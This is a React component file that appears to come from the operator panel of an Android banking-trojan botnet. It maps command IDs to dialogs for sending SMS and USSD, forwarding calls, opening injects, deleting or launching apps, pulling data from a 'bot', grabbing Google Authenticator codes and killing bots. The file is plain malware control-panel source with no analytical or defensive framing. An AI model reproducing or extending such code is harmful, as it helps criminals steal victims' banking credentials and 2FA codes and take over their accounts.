import React from "react";
import SendSMS from "./SendSMS";
import SendUSSD from "./SendUSSD";
import ForwardCall from "./ForwardCall";
import OpenInject from "./OpenInject";
import BOTKILL from "./BOTKILL";
//import DebugCommand from './DebugCommand';
import DeleteApps from "./DeleteApps";
import RunApplication from "./RunApplication";
import SendPush from "./SendPush";
import OpenLink from "./OpenLink";
import GetDataFromBot from "./GetDataFromBot";
import UpdateModule from "./UpdateModule";
//import SendSMSALL from './SendSMSALL';
import GetGoogleAUTH from "./GetGoogleAUTH";
import Modal from "../../components/Modal";

class CommandsList extends React.Component {
  state = {
    isOpen: false,
  };
  render() {
    const { selectedCommandId } = this.props;
    const componentMapping = {
      sms: <SendSMS />,
      ussd: <SendUSSD />,
      call_forwarding: <ForwardCall />,
      open_inject: <OpenInject />,
      run_app: <RunApplication />,
      push: <SendPush />,
      open_url: <OpenLink />,
      get_data_device: <GetDataFromBot />,
      delete_app: <DeleteApps />,
      update: <UpdateModule />,
      google_authenticator: <GetGoogleAUTH />,
      bot_commands: <BOTKILL />,
    };
    return (
      <React.Fragment>
        <div class="card-body">
          {selectedCommandId && (
            <Modal
              open={this.state.isOpen}
              onClose={() => this.props.onCloseModal()}
            >
              {componentMapping[selectedCommandId]}
            </Modal>
          )}
        </div>
      </React.Fragment>
    );
  }
}

export default CommandsList;
